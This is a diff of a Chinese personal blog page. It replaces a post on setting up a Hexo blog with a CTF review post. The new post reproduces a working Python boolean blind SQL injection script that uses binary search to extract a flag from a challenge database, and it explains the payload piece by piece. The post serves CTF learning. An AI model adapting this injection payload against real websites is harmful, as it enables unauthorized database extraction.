@@ -12,7 +12,7 @@
 
     
     <title>
-        初次搭建博客 |
+        SQL注入中有趣二分算法 |
         
         Ni0duann的博客</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
@@ -23,18 +23,20 @@
     
 <link rel="stylesheet" href="/css/loader.css">
 
-    <meta name="description" content="看完这篇，搭建博客有手就行##写在前面得话：真的超超级大雨，被淋爆了。乞求周末这两天线上上课(bushi祈求早点放晴呜呜呜市区已沦陷，每天上课裤子都没了。中午没睡，盲猜老师先上课搭建博客（猜错了真的难奔，踩坑真不少，折腾难受，本来想写山河wp的，到了week3山河基本做不下去，太菜了，狠狠沉淀准备hackgames吧，加上山河week2的wp写得太乱了，发现好多搭建博客的教程细节不太到位，导致连续">
+    <meta name="description" content="在复盘newstartctf2023遇到一个SQL注入有趣的脚本，采用二分算法进行布尔盲注。废物的我完全不懂布尔盲注就算了，计算机专业的还不懂python脚本，用了gpt折腾了一个小时，麻了。痛前改非，转战看文章从基础补起来，不然没次都赖着用gpt看懂，就会点大概基础原理知识，就给放了（一个脚本小子，工具小子 代码是官方wp给出的import requests import time  def c">
 <meta property="og:type" content="article">
-<meta property="og:title" content="初次搭建博客">
-<meta property="og:url" content="https://ni0duann.github.io/2023/10/20/%E5%88%9D%E6%AC%A1%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/index.html">
+<meta property="og:title" content="SQL注入中有趣二分算法">
+<meta property="og:url" content="https://ni0duann.github.io/2023/11/21/%E4%BA%8C%E5%88%86%E7%AE%97%E6%B3%95/index.html">
 <meta property="og:site_name" content="Ni0duann的博客">
-<meta property="og:description" content="看完这篇，搭建博客有手就行##写在前面得话：真的超超级大雨，被淋爆了。乞求周末这两天线上上课(bushi祈求早点放晴呜呜呜市区已沦陷，每天上课裤子都没了。中午没睡，盲猜老师先上课搭建博客（猜错了真的难奔，踩坑真不少，折腾难受，本来想写山河wp的，到了week3山河基本做不下去，太菜了，狠狠沉淀准备hackgames吧，加上山河week2的wp写得太乱了，发现好多搭建博客的教程细节不太到位，导致连续">
+<meta property="og:description" content="在复盘newstartctf2023遇到一个SQL注入有趣的脚本，采用二分算法进行布尔盲注。废物的我完全不懂布尔盲注就算了，计算机专业的还不懂python脚本，用了gpt折腾了一个小时，麻了。痛前改非，转战看文章从基础补起来，不然没次都赖着用gpt看懂，就会点大概基础原理知识，就给放了（一个脚本小子，工具小子 代码是官方wp给出的import requests import time  def c">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-10-20T02:39:25.000Z">
-<meta property="article:modified_time" content="2023-11-14T17:12:08.260Z">
+<meta property="og:image" content="https://ni0duann.github.io/images/%E7%AE%97%E6%B3%95/Snipaste_2023-11-22_01-33-37.png">
+<meta property="article:published_time" content="2023-11-21T15:41:44.000Z">
+<meta property="article:modified_time" content="2023-11-21T18:44:13.599Z">
 <meta property="article:author" content="Ni0duann">
-<meta property="article:tag" content="博客搭建">
+<meta property="article:tag" content="基础算法">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ni0duann.github.io/images/%E7%AE%97%E6%B3%95/Snipaste_2023-11-22_01-33-37.png">
     
         <link rel="alternate" href="/atom.xml" title="Ni0duann的博客" type="application/atom+xml">
     
@@ -109,7 +111,7 @@
         <div id="wrap">
             <header id="header">
     
-        <img data-src="https://d-sketon.top/img/backimg/bg1.jpg" data-sizes="auto" alt="初次搭建博客" class="lazyload">
+        <img data-src="/images/banner.jpg" data-sizes="auto" alt="SQL注入中有趣二分算法" class="lazyload">
     
     <div id="header-outer" class="outer">
         <div id="header-title" class="inner">
@@ -117,7 +119,7 @@
                 
                     
                     
-                        <a href="/" id="logo"><h1>初次搭建博客</h1></a>
+                        <a href="/" id="logo"><h1>SQL注入中有趣二分算法</h1></a>
                     
                 
             </div>
@@ -166,20 +168,20 @@
 </header>
 
             <div id="content" class="outer">
-                <section id="main"><article id="post-初次搭建博客" class="h-entry article article-type-post"
+                <section id="main"><article id="post-二分算法" class="h-entry article article-type-post"
          itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
     <div class="article-inner">
         <div class="article-meta">
             <div class="article-date wow slideInLeft">
-    <a href="/2023/10/20/%E5%88%9D%E6%AC%A1%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/" class="article-date-link">
-        <time datetime="2023-10-20T02:39:25.000Z"
-              itemprop="datePublished">2023-10-20</time>
+    <a href="/2023/11/21/%E4%BA%8C%E5%88%86%E7%AE%97%E6%B3%95/" class="article-date-link">
+        <time datetime="2023-11-21T15:41:44.000Z"
+              itemprop="datePublished">2023-11-21</time>
     </a>
 </div>
 
             
     <div class="article-category wow slideInLeft">
-        <a class="article-category-link" href="/categories/%E7%9E%8E%E5%86%99/">瞎写</a>
+        <a class="article-category-link" href="/categories/%E7%AE%97%E6%B3%95/">算法</a>
     </div>
 
 
@@ -189,31 +191,79 @@
 
         <div class="e-content article-entry" itemprop="articleBody">
             
-                <h1 id="看完这篇，搭建博客有手就行"><a href="#看完这篇，搭建博客有手就行" class="headerlink" title="看完这篇，搭建博客有手就行"></a>看完这篇，搭建博客有手就行</h1><p>##写在前面得话：<br>真的超超级大雨，被淋爆了。<del>乞求周末这两天线上上课(bushi</del>祈求早点放晴<br>呜呜呜市区已沦陷，每天上课裤子都没了。中午没睡，盲猜老师先上课搭建博客（猜错了真的难奔，踩坑真不少，折腾难受，本来想写山河wp的，到了week3山河基本做不下去，太菜了，狠狠沉淀准备hackgames吧，加上山河week2的wp写得太乱了，发现好多搭建博客的教程细节不太到位，导致连续踩坑（<del>可能我太笨了</del><br>#正题：<br>看了好几种方法，还是hexo结合githubPage最好。</p>
-<h1 id="1-下载git和node-js（Windows系统）"><a href="#1-下载git和node-js（Windows系统）" class="headerlink" title="1.下载git和node.js（Windows系统）"></a>1.下载git和node.js（Windows系统）</h1><p>这个基本没坑，盲入。安装后一直摁next即可完成。<br>有一个坑是可能npm命令报错：运行一堆err<br>找到.npmrc文件删除即可<br>找不到的先打开隐藏文件可见开关<br>用npm cache clean –force命令删除好像也行，不过我用了没效果<br>还有个难受点Win11好像右键隐藏了很多软件的右键功能，导致git右键使用困难。我个人感觉很受影响，例如nodepad++也不方便。解决方法：（参考其他博客的教程    cmd输入<br><code>reg.exe add &quot;HKCU\Software\Classes\CLSID\&#123;86ca1aa0-34aa-4e8b-a509-50c905bae2a2&#125;\InprocServer32&quot; /f /ve</code><br>回车，重启</p>
-<p>想恢复 cmd输入<br><code>reg.exe delete &quot;HKCU\Software\Classes\CLSID\&#123;86ca1aa0-34aa-4e8b-a509-50c905bae2a2&#125;\InprocServer32&quot; /va /f</code><br>回车，重启</p>
-<h1 id="2-安装hexo搭建本地博客"><a href="#2-安装hexo搭建本地博客" class="headerlink" title="2.安装hexo搭建本地博客"></a>2.安装hexo搭建本地博客</h1><h3 id="（1）安装hexo"><a href="#（1）安装hexo" class="headerlink" title="（1）安装hexo"></a>（1）安装hexo</h3><p>安装之前先建立一个空文档用于存放本地博客<br>右键打开gitbash<br>输入<br><code>npm install -g hexo-cli</code></p>
-<h3 id="（2）初始化hexo，新建存储博客的文件夹"><a href="#（2）初始化hexo，新建存储博客的文件夹" class="headerlink" title="（2）初始化hexo，新建存储博客的文件夹"></a>（2）初始化hexo，新建存储博客的文件夹</h3><p>来着hexo官网，按顺序每一步，没坑</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br><span class="line">hexo init blog</span><br><span class="line">cd blog</span><br><span class="line">npm install</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure>
-<h3 id="（3）使用Netlify部署博客及部署自动化（感觉可以忽略，有需要再搞连续创建了两个账号都立刻被封了说我账号有问题"><a href="#（3）使用Netlify部署博客及部署自动化（感觉可以忽略，有需要再搞连续创建了两个账号都立刻被封了说我账号有问题" class="headerlink" title="（3）使用Netlify部署博客及部署自动化（感觉可以忽略，有需要再搞连续创建了两个账号都立刻被封了说我账号有问题"></a>（3）使用Netlify部署博客及部署自动化（感觉可以忽略，有需要再搞连续创建了两个账号都立刻被封了说我账号有问题</h3><h3 id="（4）连接github仓库真的巨多坑，卡了有点久（类目"><a href="#（4）连接github仓库真的巨多坑，卡了有点久（类目" class="headerlink" title="（4）连接github仓库真的巨多坑，卡了有点久（类目"></a>（4）连接github仓库<del>真的巨多坑，卡了有点久（类目</del></h3><p>1.github建立仓库,<big><strong>一定要用github的username</strong></big>去建立（卡了巨久，真的坑，很多博主本来github就创建得好名字，顾直接用一样的，一笔带过了，不仔细看不知道，被这404卡哭了<br>2.生成SSH添加到GitHub<br>回到你的git bash中，</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;yourname&quot;</span><br><span class="line">git config --global user.email &quot;youremail&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>在输入，连续摁回车</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;youremail&quot;</span><br></pre></td></tr></table></figure>
-<p>生成了.ssh的文件夹。在你的电脑中找到这个文件夹<br>打开完全复制public那个，添加到github中，名称随便；<br>3.接下来也是坑<br>有了秘钥就可以用<br><code>ssh -T git@github.com</code><br>查看是否成功<br>将hexo部署到GitHub<br>这一步，我们就可以将hexo和GitHub关联起来，也就是将hexo生成的文章部署到GitHub上，打开站点配置文件 _config.yml，翻到最后，修改为<br>YourgithubName就是你的GitHub账户<br>不要用<a target="_blank" rel="noopener" href="https://github.com/YourgithubName/YourgithubName.github.io.git%E8%BF%99%E7%A7%8Drepo%E8%BF%9E%E7%BB%AD%E6%8A%98%E8%85%BE%E5%87%A0%E4%B8%8Bgit%E6%8A%A5%E9%94%99%EF%BC%8C%E5%B7%A8%E5%9D%91%E5%AE%9E%E5%9C%A8%E6%B2%A1%E6%83%B3%E5%88%B0">https://github.com/YourgithubName/YourgithubName.github.io.git这种repo连续折腾几下git报错，巨坑实在没想到</a><br>报错后还得删git文件，几行命令虽然不麻烦，但是就是得折腾<br>正确的：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">type: git</span><br><span class="line">repo: git@github.com:YourgithubName/YourgithubName.github.io.git</span><br><span class="line">branch: master</span><br></pre></td></tr></table></figure>
+                <p>在复盘newstartctf2023遇到一个SQL注入有趣的脚本，采用二分算法进行布尔盲注。废物的我完全不懂布尔盲注就算了，计算机专业的还不懂python脚本，用了gpt折腾了一个小时，麻了。痛前改非，转战看文章从基础补起来，不然没次都赖着用gpt看懂，就会点大概基础原理知识，就给放了（<del>一个脚本小子，工具小子</del></p>
+<h1 id="代码是官方wp给出的"><a href="#代码是官方wp给出的" class="headerlink" title="代码是官方wp给出的"></a>代码是官方wp给出的</h1><pre><code>import requests
+import time
 
-<p>#最后：<br>第一次写博客，还是模仿一些大佬的写作风格，真的烂，希望能坚持周记(<del>雨停了，好像明天的上课，这就是救生游泳课没认真学的惩罚吗呜呜呜</del>，太累不想加图片，感觉应该能看懂，重要点都在了，我的主题也没搞好，收工看剧睡觉（难受</p>
+def condition(res):
+    if &#39;Physics&#39; in res.text:
+        return True
+    return False
+
+result = &#39;&#39;
+_url = &#39;http://d2bac43e-3167-4cf0-89b1-ee94cf98d10e.node4.buuoj.cn:81/&#39;
+
+for _time in range(1, 1000):
+    print(&quot;time:%d&quot; % (_time))
+
+    left = 32
+    right = 128
+
+    while right &gt; left:
+        mid = (left + right) // 2
+        print(mid)
+
+        # 获取字段值
+        url = f&quot;&#123;_url&#125;?id=TMP0919&#39; And if((((Ord(sUbstr((Select(flag)fRom(here_is_flag)) fRom &#123;_time&#125; FOr 1))))In(&#123;mid&#125;)),1,0)%23&quot;
+
+        # 防止请求速率过快
+        time.sleep(0.2)
+
+        res = requests.get(url=url)
+
+        if condition(res):
+            result += chr(mid)
+            print(result)
+            break
+        else:
+            url = f&quot;&#123;_url&#125;?id=TMP0919&#39; And if((((Ord(sUbstr((Select(flag)fRom(here_is_flag)) fRom &#123;_time&#125; FOr 1))))&gt;(&#123;mid&#125;)),1,0)%23&quot;
+
+            res = requests.get(url=url)
+
+            if condition(res):
+                left = mid
+            else:
+                right = mid
+</code></pre>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45978890/article/details/116094046">https://blog.csdn.net/qq_45978890/article/details/116094046</a></p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>每次把查找分成两部分，通过和中值比较，不停丢弃不在范围的另外一部分(有个很重要的前提，要查找的数据就是必须是有序的排序)</p>
+<h1 id="介绍两种写法前，先搞懂这个问题，（直接放博主的，因为Ni0duann被说中了"><a href="#介绍两种写法前，先搞懂这个问题，（直接放博主的，因为Ni0duann被说中了" class="headerlink" title="介绍两种写法前，先搞懂这个问题，（直接放博主的，因为Ni0duann被说中了"></a>介绍两种写法前，先搞懂这个问题，（直接放博主的，因为Ni0duann被说中了</h1><p>但是千万不要一直纠结中间的数字两边的数字数量不一样这个问题，因为：</p>
+<p>两边数量不一样是一定会出现的情况<br>但是这种情况并不影响我们对中间数字和目标数字大小关系的判断<br>只要中间数字大于目标数字，就排除右边的<br>只要中间数字小于目标数字，就排除左边的<br>所以数组长度是偶数还是奇数这个真的不重要，不影响怎么排除的问题，无非是多排除一个数字或者少排除一个数字</p>
+<p>真正影响的是中间那个数字到底该不该加入下一次的查找中，也就是边界问题。</p>
+<p>二分法最重要的两个点：<br>while循环中 left 和 right 的关系，到底是 left &lt;&#x3D; right 还是 left &lt; right<br>迭代过程中 middle 和 right 的关系，到底是 right &#x3D; middle - 1 还是 right &#x3D; middle</p>
+<h1 id="第一种写法-左闭右闭"><a href="#第一种写法-左闭右闭" class="headerlink" title="第一种写法(左闭右闭)"></a>第一种写法(左闭右闭)</h1><p>循环条件要使用while(left &lt;&#x3D; right)，因为当(left &#x3D;&#x3D; right)这种情况发生的时候，**得到的结果是有意义的**<br>if(nums[middle] &gt; target) ， right 要赋值为 middle - 1， 因为当前的 nums[middle] 一定不是 target ，需要把这个 middle 位置上面的数字丢弃，（不然拿等号来吃灰了，没作用</p>
+<h1 id="第二种写法-左闭右开"><a href="#第二种写法-左闭右开" class="headerlink" title="第二种写法(左闭右开)"></a>第二种写法(左闭右开)</h1><p>循环条件使用while (left &lt; right)<br>if (nums[middle] &gt; target)， right &#x3D; middle，因为当前的 nums[middle] 是大于 target 的，不符合条件,不能取到 middle，并且区间的定义是 [left, right)，刚好区间上的定义就取不到 right, 所以 right 赋值为 middle。</p>
+<h1 id="回到原题"><a href="#回到原题" class="headerlink" title="回到原题"></a>回到原题</h1><p> left &#x3D; 32<br>    right &#x3D; 128<br>就说怎么看不懂，32到128刚好就是可打印的ASCII码，真的巧妙</p>
+<p>  获取字段值<br>        url &#x3D; f”{_url}?id&#x3D;TMP0919’ And if((((Ord(sUbstr((Select(flag)fRom(here_is_flag)) fRom {_time} FOr 1))))In({mid})),1,0)%23”<br>这臭代码怎么看呢，昨晚指望那个白嫖的gpt就算了一言难尽<br>还好菜鸡还有菜鸡的方法<br><img src="/../images/%E7%AE%97%E6%B3%95/Snipaste_2023-11-22_01-33-37.png" alt="Alt text"><br>分解了舒服点，代码还得是一口一口喂舒服qwq</p>
+<p>And if((((Ord(sUbstr((Select(flag)From(here_is_flag)) From {_time} For 1)))) In({mid})),1,0)%23：这是SQL注入的语法，用于在查询中判断一个条件。</p>
+<p>Select(flag)From(here_is_flag)：这是一个查询语句，从名为here_is_flag的表中选择flag列的值。</p>
+<p>sUbstr(… From {_time} For 1)：这是一个子字符串函数，从here_is_flag表中的目标列（flag）的位置为{_time}的字符开始，获取长度为1的子字符串。可以逐个获取字符。</p>
+<p>Ord(…)：这是一个内置函数，将一个字符转换为它的ASCII码值。</p>
+<p>In({mid})：这是一个条件，用来判断获取到的字符的ASCII码值是否在范围内。{mid}是之前计算得到的中间值，即要比较的字符的ASCII码值。</p>
+<p>if(…, 1, 0)：这是一个条件语句，如果条件成立，则返回1，否则返回0。</p>
+<p>%23：这是URL编码后的#字符，</p>
+<p>这里的condition判断也很简单，如果get请求返回Physics则该字符存在，拼接输出<br>SQL括号多，分解后用hackbar尝试可以更深理解<br>这里涉及的SQL函数：<br>in(v1,v2,v3,v4,v5,v6)<br>substr(start,length)<br>ord()转ASCII码</p>
 
             
         </div>
         <footer class="article-footer">
-            <a data-url="https://ni0duann.github.io/2023/10/20/%E5%88%9D%E6%AC%A1%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/" data-id="clp8oqrfq0008pwg20gt9cthd" data-title="初次搭建博客"
+            <a data-url="https://ni0duann.github.io/2023/11/21/%E4%BA%8C%E5%88%86%E7%AE%97%E6%B3%95/" data-id="clp8oqrft000dpwg22ofqbmmh" data-title="SQL注入中有趣二分算法"
                class="article-share-link">分享</a>
             
             
             
             
-    <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" rel="tag">博客搭建</a></li></ul>
+    <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95/" rel="tag">基础算法</a></li></ul>
 
 
         </footer>
@@ -222,20 +272,20 @@
         
     <nav id="article-nav" class="wow fadeInUp">
         
-            <div class="article-nav-link-wrap article-nav-link-left">
+        
+            <div class="article-nav-link-wrap article-nav-link-right">
                 
-                    <img data-src="https://d-sketon.top/img/backimg/bg2.jpg" data-sizes="auto" alt="SHCTH203WEB_wp"
+                    <img data-src="https://d-sketon.top/img/backimg/bg5.jpg" data-sizes="auto" alt="NewStartCTF2023-week3-WEB-wp"
                          class="lazyload">
                 
-                <a href="/2023/11/05/SHCTH203WEB-wp/"></a>
-                <div class="article-nav-caption">前一篇</div>
+                <a href="/2023/11/20/NewStartCTF2023-week3-WEB-wp/"></a>
+                <div class="article-nav-caption">后一篇</div>
                 <h3 class="article-nav-title">
                     
-                        SHCTH203WEB_wp
+                        NewStartCTF2023-week3-WEB-wp
                     
                 </h3>
             </div>
-        
         
     </nav>
 
